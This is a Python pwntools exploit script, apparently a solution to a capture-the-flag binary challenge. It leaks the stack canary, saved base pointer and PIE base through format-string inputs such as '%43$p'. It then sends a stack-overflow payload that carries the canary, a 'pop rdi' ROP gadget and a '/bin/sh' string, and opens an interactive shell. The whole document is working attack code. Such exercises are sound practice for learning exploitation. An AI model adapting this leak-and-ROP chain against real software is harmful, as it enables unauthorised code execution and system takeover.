#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import sys 

exe = context.binary = ELF(sys.argv[1])
rop = ROP(exe)
libc = exe.libc

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

io = start()

#================= Leak Canary ==================================
io.sendline(b"PRINTS")
io.sendline(b"%43$p")
io.sendline(b"EXEC")
canary = int(io.recvline_regex(b"0x[0-9a-f]+"), 16)
print(f"Canary: {hex(canary)}")

#================= Leak RBP ==================================
io.sendline(b"PRINTS")
io.sendline(b"%44$p")
io.sendline(b"EXEC")
rbp = int(io.recvline_regex(b"0x[0-9a-f]+"), 16)
print(f"RBP: {hex(rbp)}")

#================= Leak PIE Base ==================================
io.sendline(b"PRINTS")
io.sendline(b"%45$p")
io.sendline(b"EXEC")
call_site = int(io.recvline_regex(b"0x[0-9a-f]+"), 16)
live_exec_instruction = call_site - 236 
base_addr = live_exec_instruction - exe.sym['exec_instructions']
exe.address = base_addr
print(f"Base: {hex(base_addr)}")



pwn_func5 = exe.symbols['pwn_func5']
print(f"pwn_func5: {hex(pwn_func5)}")
print(f"TYPE: {type(exe.address)}")
print(f'GADGETS:{rop.rdi.address}')



payload = (
        b"PRINTS "
        + b'A' * (272-8)  
          + p64(canary)  
          + p64(rbp) 
          + p64(rop.rdi.address + base_addr) 
          + p64(rbp + 64) 
          + p64(pwn_func5) 
          + p64(0) 
          + p64(0) 
          + p64(0)  
          + p64(0) 
          + p64(rbp + 80) 
          + p64(0)     
          + b'/bin/sh\0'
          )


io.sendlineafter(b'Enter command: ', payload)
io.sendlineafter(b'Enter command: ', b'exec\n')
io.interactive()
io.close()
